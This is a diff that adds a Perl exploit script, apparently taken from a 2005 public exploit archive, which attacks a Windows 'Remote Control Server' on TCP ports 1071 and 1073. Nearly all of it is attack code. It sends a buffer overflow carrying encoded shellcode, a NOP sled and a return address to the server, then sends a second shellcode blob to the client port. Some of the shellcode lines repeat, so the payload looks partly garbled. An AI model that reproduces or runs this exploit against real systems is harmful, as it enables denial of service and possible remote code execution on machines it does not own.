@@ -1,0 +1,113 @@
+#!/usr/local/bin/perl
+#
+#  Remote Control Server DOS Exploit
+# ------------------------------------
+# Infam0us Gr0up - Securiti Research
+# 
+#
+# Tested on Windows2000 SP4 (Win NT)
+# Info: infamous.2hell.com
+#
+
+$ARGC=@ARGV;
+if ($ARGC !=1) {
+    print "\n";
+    print " Remote Control Server DOS Exploit\n";
+    print "------------------------------------\n\n";
+    print "Usage: $0 [remote IP]\n";
+    print "Exam: $0 127.0.0.1\n";
+    exit;
+}
+use Socket;
+
+my($remote,$port,$iaddr,$paddr,$proto);
+$remote=$ARGV[0];
+$port = "1071"; 
+print "\n";
+print "[+] Connect to $remote..\n";
+
+$iaddr = inet_aton($remote) or die "Error: $!";
+$paddr = sockaddr_in($port, $iaddr) or die "Error: $!";
+$proto = getprotobyname('tcp') or die "Error: $!";
+
+
+socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die "Error: $!";
+connect(SOCK, $paddr) or die "Error: $!";
+
+print "[+] Connected\n";
+print "[+] Build server sploit..\n";
+sleep(3);
+$sploit = "\xeb\x03\x5a\xeb\x05\xe8\xf8\xff\xff\xff\x8b\xec\x8b\xc2\x83\xc0\x18\x33\xc9";
+$sploit=$sploit . "\x66\xb9\xb3\x80\x66\x81\xf1\x80\x80\x80\x30\x99\x40\xe2\xfa\xaa\x59";
+$sploit=$sploit . "\xf1\x19\x99\x99\x99\xf3\x9b\xc9\xc9\xf1\x99\x99\x99\x89\x1a\x5b\xa4";
+$sploit=$sploit . "\xcb\x27\x51\x99\xd5\x99\x66\x8f\xaa\x59\xc9\x27\x09\x98\xd5\x99\x66";
+$sploit=$sploit . "\x8f\xfa\xa3\xc5\xfd\xfc\xff\xfa\xf6\xf4\xb7\xf0\xe0\xfd\x99";
+
+print "[+] Attacking server..\n";
+sleep(2);
+$msg = "reboot" . $sploit . "\x90" x (3096 - length($sploit)) . "\xe8\xf1\xc5\x05" . "|LOGOFF|";
+print $msg;
+send(SOCK, $msg, 0) or die "Cannot send query: $!";
+print "DONE\n";
+print "[+] Server D0s'ed\n";
+sleep(1);
+close(SOCK);
+
+my($remote,$port,$iaddr,$paddr,$proto);
+$remote=$ARGV[0];
+$port1 = "1073"; 
+
+print "[+] Connect to Client server..\n";
+
+$iaddr = inet_aton($remote) or die "Error: $!";
+$paddr = sockaddr_in($port1, $iaddr) or die "Error: $!";
+$proto = getprotobyname('tcp') or die "Error: $!";
+
+socket(SOCK1, PF_INET, SOCK_STREAM, $proto) or die "Error: $!";
+connect(SOCK1, $paddr) or die "Error: $!";
+
+print "[+] Connected\n";
+print "[+] Build client Spl0it..\n";
+sleep(3);
+
+$dos =
+"\xeb\x6e\x5e\x29\xc0\x89\x46\x10".
+"\x40\x89\xc3\x89\x46\x0c\x40\x89".
+"\x46\x08\x8d\x4e\x08\xb0\x66\xcd".
+"\x40\x89\xc3\x89\x46\x0c\x40\x89".
+"\x46\x08\x8d\x4e\x08\xb0\x66\xcd".
+"\x80\x43\xc6\x46\x10\x10\x88\x46".
+"\x08\x31\xc0\x31\xd2\x89\x46\x18".
+"\xb0\x90\x66\x89\x46\x16\x8d\x4e".
+"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0".
+"\x66\xcd\x80\x89\x5e\x0c\x43\x43".
+"\xb0\x66\xcd\x80\x89\x56\x0c\x89".
+"\x08\x31\xc0\x31\xd2\x89\x46\x18".
+"\xb0\x90\x66\x89\x46\x16\x8d\x4e".
+"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0".
+"\x56\x10\xb0\x66\x43\xcd\x80\x86".
+"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0".
+"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0".
+"\x66\xcd\x80\x89\x5e\x0c\x43\x43".
+"\xb0\x66\xcd\x80\x89\x56\x0c\x89".
+"\x56\x10\xb0\x66\x43\xcd\x80\x86".
+"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0".
+"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd".
+"\x80\x88\x56\x07\x89\x76\x0c\x87".
+"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80".
+"\xe8\x8d\xff\xff";
+
+
+print "[+] Attacking client..\n";
+sleep(2);
+
+print $dos;
+send(SOCK1, $dos, 0) or die "Cannot send query: $!";
+
+print "DONE\n";
+print "[+] Client D0s'ed\n";
+sleep(1);
+close(SOCK1);
+exit;
+
+# milw0rm.com [2005-07-15]
